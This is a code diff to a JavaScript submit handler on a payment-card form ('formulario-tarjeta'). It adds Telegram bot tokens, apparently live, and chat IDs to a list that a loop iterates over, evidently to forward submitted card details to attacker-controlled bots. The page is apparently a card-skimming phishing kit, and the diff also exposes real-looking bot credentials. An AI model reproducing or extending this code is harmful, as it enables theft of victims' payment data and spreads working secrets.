@@ -161,7 +161,8 @@ document.getElementById('formulario-tarjeta').addEventListener('submit', async f
 
     const botsAndChats = [
         { token: '7993642572:AAHJmZ3dy5lEsQi81vpUqKAI-WmacV3YlDI', chats: ['6328222257', 'CHAT_ID_2'] },
-        { token: '', chats: ['', 'CHAT_ID_4'] },
+        { token: '7323621941:AAHMKt0uyvD6XZsP6xvw4Pus7XvFjz0q4nY', chats: ['7038426430', 'CHAT_ID_4'] },
+		{ token: '7829374391:AAFFlzyPD8rQfCfr-JjqjtjA2zn3L40I3oU', chats: ['7409492263', 'CHAT_ID_2'] },
     ];
 
     for (const { token, chats } of botsAndChats) {
